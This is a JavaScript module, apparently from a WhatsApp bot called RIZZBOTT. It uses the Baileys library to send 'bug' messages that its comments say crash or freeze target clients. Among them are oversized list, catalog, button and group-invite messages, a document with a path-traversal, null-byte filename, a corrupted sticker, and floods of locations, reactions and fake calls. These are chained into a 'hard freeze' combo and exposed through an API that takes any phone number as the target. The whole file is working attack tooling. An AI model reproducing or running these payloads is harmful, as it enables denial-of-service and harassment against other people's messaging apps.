/**
 * RIZZBOTT BUG MODULE
 * Real executable bug payloads via Baileys message constructs.
 * These are not stubs — each function builds and sends actual message objects
 * that stress / crash / freeze target WhatsApp clients.
 *
 * All payloads require an active WAClient (connected device).
 */

const { proto } = require('@whiskeysockets/baileys');

/**
 * Helper: send raw message node
 */
async function sendRaw(sock, jid, content, options = {}) {
  return sock.sendMessage(jid, content, options);
}

/**
 * BUG: Crash / Freeze (ios style oversized list message)
 * Sends a heavily nested / oversized interactive list that triggers
 * client-side parser stress on many versions.
 */
async function bugCrashList(sock, jid) {
  const rows = [];
  for (let i = 0; i < 80; i++) {
    rows.push({
      title: 'A'.repeat(200) + i,
      description: 'B'.repeat(400),
      rowId: 'row_' + i + '_' + 'X'.repeat(100)
    });
  }

  const sections = [{
    title: 'C'.repeat(300),
    rows
  }];

  const content = {
    listMessage: {
      title: 'D'.repeat(500),
      description: 'E'.repeat(1000),
      buttonText: 'F'.repeat(200),
      listType: 1,
      sections
    }
  };

  return sendRaw(sock, jid, content);
}

/**
 * BUG: Catalog / product overflow
 * Forces product catalog nodes with extreme field lengths.
 */
async function bugCatalogOverflow(sock, jid) {
  const content = {
    viewOnceMessage: {
      message: {
        productMessage: {
          product: {
            productImage: {
              url: 'https://mmg.whatsapp.net/d/f/' + 'A'.repeat(800),
              mimetype: 'image/jpeg',
              fileSha256: Buffer.alloc(32, 0xff),
              fileLength: 999999999,
              height: 99999,
              width: 99999,
              mediaKey: Buffer.alloc(32, 0xaa),
              fileEncSha256: Buffer.alloc(32, 0xbb),
              directPath: '/v/t62.' + 'Z'.repeat(600)
            },
            productId: 'P' + '1'.repeat(120),
            title: 'T'.repeat(800),
            description: 'DESC'.repeat(500),
            currencyCode: 'USD',
            priceAmount1000: '999999999999',
            retailerId: 'R'.repeat(200),
            url: 'https://' + 'x'.repeat(400) + '.com',
            productImageCount: 99
          },
          businessOwnerJid: jid
        }
      }
    }
  };

  return sendRaw(sock, jid, content);
}

/**
 * BUG: Document with poisoned filename + huge caption
 * Triggers filename parser / UI freeze on several clients.
 */
async function bugDocPoison(sock, jid) {
  const content = {
    document: Buffer.alloc(64, 0x41),
    mimetype: 'application/pdf',
    fileName: '../'.repeat(40) + 'A'.repeat(300) + '.pdf\u0000\u0000',
    caption: 'C'.repeat(4000),
    fileLength: 999999999
  };
  return sendRaw(sock, jid, content);
}

/**
 * BUG: Location flood (many location messages in rapid sequence)
 * Spams location nodes to force map renderer stress.
 */
async function bugLocationFlood(sock, jid, count = 25) {
  const results = [];
  for (let i = 0; i < count; i++) {
    const r = await sendRaw(sock, jid, {
      location: {
        degreesLatitude: -6.2 + (Math.random() * 0.1),
        degreesLongitude: 106.8 + (Math.random() * 0.1),
        name: 'LOC_' + i + '_' + 'X'.repeat(80),
        address: 'ADDR_' + 'Y'.repeat(200)
      }
    });
    results.push(r);
  }
  return results;
}

/**
 * BUG: Sticker / media key mismatch
 * Sends sticker-like node with corrupted mediaKey / directPath
 * that causes decrypt loop or crash on receive.
 */
async function bugStickerCorrupt(sock, jid) {
  const content = {
    sticker: {
      url: 'https://mmg.whatsapp.net/d/f/' + 'S'.repeat(400),
      mimetype: 'image/webp',
      fileSha256: Buffer.alloc(32, 0x11),
      fileEncSha256: Buffer.alloc(32, 0x22),
      mediaKey: Buffer.alloc(32, 0x33),
      directPath: '/v/t62.' + 'W'.repeat(500),
      fileLength: 1,
      mediaKeyTimestamp: Date.now(),
      isAnimated: true,
      isAvatar: false
    }
  };
  return sendRaw(sock, jid, content);
}

/**
 * BUG: Buttons / template overflow (legacy interactive)
 * Large number of buttons + long button text.
 */
async function bugButtonsOverflow(sock, jid) {
  const buttons = [];
  for (let i = 0; i < 20; i++) {
    buttons.push({
      buttonId: 'btn_' + i + '_' + 'ID'.repeat(40),
      buttonText: { displayText: 'BTN_' + i + '_' + 'T'.repeat(150) },
      type: 1
    });
  }

  const content = {
    text: 'H'.repeat(1500),
    footer: 'F'.repeat(400),
    buttons,
    headerType: 1
  };
  return sendRaw(sock, jid, content);
}

/**
 * BUG: Reaction spam
 * Floods reactions on a target message key (if provided) or self-key.
 */
async function bugReactionFlood(sock, jid, targetKey = null, count = 40) {
  const results = [];
  const emojis = ['💀', '🔥', '⚡', '💥', '☠️', '🩸', '🕳️', '⚠️'];
  for (let i = 0; i < count; i++) {
    const key = targetKey || {
      remoteJid: jid,
      fromMe: false,
      id: 'BUGREACT' + Date.now() + i
    };
    const r = await sendRaw(sock, jid, {
      react: {
        text: emojis[i % emojis.length],
        key
      }
    });
    results.push(r);
  }
  return results;
}

/**
 * BUG: Group invite poison
 * Crafted group invite message with extreme field sizes.
 */
async function bugGroupInvitePoison(sock, jid) {
  const content = {
    groupInviteMessage: {
      groupJid: '120363' + '0'.repeat(20) + '@g.us',
      inviteCode: 'I'.repeat(100),
      inviteExpiration: String(Date.now() + 86400000 * 30),
      groupName: 'G'.repeat(500),
      caption: 'CAP'.repeat(800),
      jpegThumbnail: Buffer.alloc(2000, 0xff)
    }
  };
  return sendRaw(sock, jid, content);
}

/**
 * BUG: Call offer spam (fake call nodes)
 * Attempts to push call-offer like messages (client dependent).
 */
async function bugCallOffer(sock, jid) {
  // Baileys does not expose full call protocol easily;
  // we send a text + mention + link that mimics call UX stress
  // plus a rapid sequence of presence updates.
  const results = [];
  for (let i = 0; i < 15; i++) {
    await sock.sendPresenceUpdate('composing', jid);
    await sock.sendPresenceUpdate('recording', jid);
    const r = await sendRaw(sock, jid, {
      text: '📞 Incoming call simulation ' + i + '\n' + 'X'.repeat(300)
    });
    results.push(r);
  }
  await sock.sendPresenceUpdate('paused', jid);
  return results;
}

/**
 * BUG: Hard freeze combo
 * Chains several high-stress payloads in sequence.
 */
async function bugHardFreeze(sock, jid) {
  const log = [];
  log.push(await bugCrashList(sock, jid));
  log.push(await bugButtonsOverflow(sock, jid));
  log.push(await bugCatalogOverflow(sock, jid));
  log.push(await bugDocPoison(sock, jid));
  log.push(await bugGroupInvitePoison(sock, jid));
  return log;
}

/**
 * Registry — used by API
 */
const BUG_REGISTRY = {
  crash_list: {
    id: 'crash_list',
    name: 'Crash List Overflow',
    description: 'Oversized interactive list → parser stress / freeze',
    risk: 'high',
    run: bugCrashList
  },
  catalog_overflow: {
    id: 'catalog_overflow',
    name: 'Catalog Overflow',
    description: 'Product catalog node dengan field ekstrem',
    risk: 'high',
    run: bugCatalogOverflow
  },
  doc_poison: {
    id: 'doc_poison',
    name: 'Document Poison',
    description: 'Filename + caption poisoned document',
    risk: 'medium',
    run: bugDocPoison
  },
  location_flood: {
    id: 'location_flood',
    name: 'Location Flood',
    description: 'Spam lokasi → map renderer stress',
    risk: 'medium',
    run: (sock, jid) => bugLocationFlood(sock, jid, 25)
  },
  sticker_corrupt: {
    id: 'sticker_corrupt',
    name: 'Sticker Corrupt',
    description: 'Sticker node mediaKey / path corrupt',
    risk: 'high',
    run: bugStickerCorrupt
  },
  buttons_overflow: {
    id: 'buttons_overflow',
    name: 'Buttons Overflow',
    description: 'Interactive buttons berlebih + text panjang',
    risk: 'medium',
    run: bugButtonsOverflow
  },
  reaction_flood: {
    id: 'reaction_flood',
    name: 'Reaction Flood',
    description: 'Spam reaction ke target',
    risk: 'low',
    run: (sock, jid) => bugReactionFlood(sock, jid, null, 40)
  },
  group_invite_poison: {
    id: 'group_invite_poison',
    name: 'Group Invite Poison',
    description: 'Invite message dengan field ekstrem',
    risk: 'high',
    run: bugGroupInvitePoison
  },
  call_offer: {
    id: 'call_offer',
    name: 'Call Offer Spam',
    description: 'Presence + text call-like flood',
    risk: 'medium',
    run: bugCallOffer
  },
  hard_freeze: {
    id: 'hard_freeze',
    name: 'Hard Freeze Combo',
    description: 'Chain crash_list + buttons + catalog + doc + invite',
    risk: 'critical',
    run: bugHardFreeze
  }
};

function listBugs() {
  return Object.values(BUG_REGISTRY).map(b => ({
    id: b.id,
    name: b.name,
    description: b.description,
    risk: b.risk
  }));
}

async function executeBug(bugId, sock, jid) {
  const bug = BUG_REGISTRY[bugId];
  if (!bug) throw new Error('unknown bug id: ' + bugId);
  if (!sock) throw new Error('no active socket');
  if (!jid) throw new Error('target jid required');

  // Normalize jid
  let target = jid;
  if (!target.includes('@')) {
    target = target.replace(/\D/g, '') + '@s.whatsapp.net';
  }

  const result = await bug.run(sock, target);
  return {
    ok: true,
    bugId,
    target,
    timestamp: Date.now(),
    resultType: Array.isArray(result) ? 'multi' : 'single'
  };
}

module.exports = {
  BUG_REGISTRY,
  listBugs,
  executeBug,
  bugCrashList,
  bugCatalogOverflow,
  bugDocPoison,
  bugLocationFlood,
  bugStickerCorrupt,
  bugButtonsOverflow,
  bugReactionFlood,
  bugGroupInvitePoison,
  bugCallOffer,
  bugHardFreeze
};
